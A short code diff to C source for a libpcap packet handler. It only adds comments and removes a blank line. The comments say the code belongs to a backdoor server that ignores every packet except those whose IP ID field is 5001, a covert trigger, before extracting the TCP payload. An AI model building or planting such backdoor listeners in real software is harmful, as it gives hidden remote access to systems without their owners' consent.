@@ -86,12 +86,15 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info,
 	struct iphdr* iphdr;
 	int size_ip;
 
+	// skips to the IP header of the packet
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	size_ip = iphdr->ihl * 4;
 
+	// check to see if the packet is complete
 	if(size_ip < sizeof(struct iphdr))
 		error("pkt_handler(): Truncated IP Header");
 
+	// check if the packet is intended for the backdoor server
 	if (iphdr->id != 5001)
 		return;
 
@@ -121,7 +124,6 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 
 	if(size_tcp < 20)
 		error("handle_tcp(): invalid TCP size");
-
 
 	tcp_payload = (char *)(packet + ip_len + size_tcp);
 }
